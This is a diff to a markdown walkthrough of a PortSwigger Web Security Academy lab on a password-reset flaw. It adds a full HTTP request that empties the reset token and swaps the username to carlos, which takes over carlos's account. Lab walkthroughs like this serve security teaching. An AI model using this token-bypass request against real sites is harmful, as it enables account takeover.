@@ -96,7 +96,36 @@ By this we have sucessfully changed **wiener's password**.
 ### Resetting carlos's password -
 
 
-> What happens if we remove the token part from the URL and the parameter & forward the request.
+> What happens if we remove the token value from both the URL and the parameter & also change the username from wiener to *carlos* & forward the request?
+
+```http
+POST /forgot-password?temp-forgot-password-token= HTTP/2
+Host: 0a4600a504e6ef4c83015a0400490051.web-security-academy.net
+Cookie: session=ZE2uXQUBvlVaC1fMI0NExhWaUlzj9Vne
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 129
+Origin: https://0a4600a504e6ef4c83015a0400490051.web-security-academy.net
+Referer: https://0a4600a504e6ef4c83015a0400490051.web-security-academy.net/forgot-password?temp-forgot-password-token=foIaJd53bYvQKYOM7O642P81W3wySvas
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+temp-forgot-password-token=&username=carlos&new-password-1=newpassword&new-password-2=newpassword
+```
+
+When we forward this request, we dont get any error etc, which is a sign that something worked in the backend. Well we might have sucessfully changed the password of *carlos*.
+
+Lets try logging in as carlos with the  password which we used for reset - `newpassword`
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/67c9ee64-c8c4-4569-81bf-fcaf12bd4b63)
+
 
 
 
